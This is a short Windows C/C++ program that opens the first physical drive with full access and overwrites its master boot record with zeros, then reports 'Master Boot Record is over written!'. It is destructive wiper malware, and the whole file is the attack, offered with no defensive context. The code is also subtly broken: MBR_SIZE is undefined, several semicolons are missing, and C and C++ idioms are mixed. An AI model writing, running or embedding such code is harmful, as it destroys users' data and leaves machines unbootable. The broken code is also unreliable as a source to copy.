#include <stdio.h>
#include<Windows.h>

using namespace std;

/* run this program using the console pauser or add your own getch, system("pause") or input loop */

int main(int argc, char** argv) {
	DWORD write;
	char mbrData[MBR_SIZE];
	//overwrite
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
	,GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
	, NULL, OPEN_EXISTING, NULL, NULL )
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL)==TRUE){
		printf("Master Boot Record is over written!\n")
		
	}
	else{
		printf("\nFail")
		Sleep(5000);
	}
	CloseHandle(MasterBootRecord);
	
	return EXIT_SUCCESS;
}
